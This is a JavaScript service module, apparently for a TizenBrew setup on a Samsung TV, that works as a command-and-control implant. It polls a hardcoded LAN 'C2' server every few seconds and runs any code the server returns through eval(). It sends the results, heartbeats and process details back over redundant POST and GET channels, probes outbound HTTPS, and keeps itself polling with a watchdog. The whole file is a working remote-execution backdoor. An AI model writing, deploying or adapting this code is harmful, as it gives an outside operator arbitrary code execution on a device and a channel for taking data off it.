// tv-bridge v2 — TizenBrew service module (Node v4.4.3, ES5 only).
// Maximally defensive: three reporting channels (POST, GET, HTTPS probe),
// plain setInterval timers, no Buffer dependency, full breadcrumb logging.
// Outbound-only to the LAN C2 listener.

var __tbG = this; // top-level `this` in vm.runInContext = contextified sandbox

(function () {
    'use strict';

    var C2 = 'http://192.168.1.171:8000';
    var PROBE_URL = 'https://cdn.jsdelivr.net/npm/@foxreis/tizentube/package.json';
    var POLL_MS = 5000;
    var HB_MS = 30000;
    var WATCH_MS = 20000;

    var httpm = require('http');
    var httpsm = require('https');
    var urlm = require('url');

    var state = { started: Date.now(), polls: 0, jobs: 0, errs: 0, lastPoll: 0 };

    var gen = (__tbG.__tvBridgeGen || 0) + 1;
    __tbG.__tvBridgeGen = gen;

    function say(s) { try { console.log('[tv-bridge] ' + s); } catch (e) {} }

    function note(kind, obj) {
        var payload = obj || {};
        payload.kind = kind;
        payload.gen = gen;
        payload.ts = Date.now();
        var body = null;
        try { body = JSON.stringify(payload); } catch (e) { body = '{"kind":"' + kind + '","ser":false}'; }
        // Channel A: POST body
        try {
            var u = urlm.parse(C2 + '/note');
            var req = httpm.request({
                hostname: u.hostname, port: u.port || 80, path: u.path, method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': body.length }
            }, function (res) { res.resume(); });
            req.on('error', function () {});
            req.end(body);
        } catch (e) { state.errs += 1; say('post-err ' + e); }
        // Channel B: GET query (survives POST-body issues)
        try {
            httpm.get(C2 + '/note?d=' + encodeURIComponent(body).substring(0, 1500),
                function (res) { res.resume(); })
                .on('error', function () {});
        } catch (e) { state.errs += 1; say('get-err ' + e); }
    }

    function heartbeat() {
        note('bridge-hb', {
            pid: process.pid,
            node: process.version,
            upS: Math.round((Date.now() - state.started) / 1000),
            polls: state.polls, jobs: state.jobs, errs: state.errs,
            tizen: (typeof tizen !== 'undefined')
        });
    }

    function pollOnce() {
        state.polls += 1;
        state.lastPoll = Date.now();
        try {
            httpm.get(C2 + '/job?ts=' + Date.now(), function (res) {
                var body = '';
                res.setEncoding('utf8');
                res.on('data', function (c) { body += c; });
                res.on('end', function () {
                    var job = null;
                    try { job = JSON.parse(body); } catch (e) {}
                    if (job && job.code) runJob(job);
                });
            }).on('error', function () {});
        } catch (e) { state.errs += 1; say('poll-err ' + e); }
    }

    function runJob(job) {
        state.jobs += 1;
        var out, ok = true, err = null;
        try { out = eval(job.code); } catch (e) { ok = false; err = String((e && e.message) || e); }
        var payload = { id: job.id, ok: ok };
        if (ok) {
            try {
                payload.result = (typeof out === 'object' && out !== null)
                    ? JSON.stringify(out).substring(0, 60000)
                    : String(out).substring(0, 60000);
            } catch (e) { payload.result = 'unserializable'; }
        } else {
            payload.err = err;
        }
        note('bridge-result', payload);
    }

    say('boot gen=' + gen + ' pid=' + process.pid + ' node=' + process.version);
    note('bridge-boot', { pid: process.pid, node: process.version, tizen: (typeof tizen !== 'undefined') });

    // Channel C: HTTPS probe — proves outbound TLS from the sandbox works.
    try {
        httpsm.get(PROBE_URL, function (res) {
            res.resume();
            note('bridge-probe', { https: 'ok', status: res.statusCode });
        }).on('error', function (e) { note('bridge-probe', { https: 'err', msg: String(e && e.message || e).substring(0, 120) }); });
    } catch (e) { say('probe-exc ' + e); }

    setInterval(pollOnce, POLL_MS);
    setInterval(heartbeat, HB_MS);
    setInterval(function () {
        if (Date.now() - state.lastPoll > 3 * POLL_MS + 2000) {
            say('watchdog: polls stalled at ' + state.polls);
            pollOnce();
        }
    }, WATCH_MS);

    __tbG.__bridge = { state: state, C2: C2, gen: gen };
})();
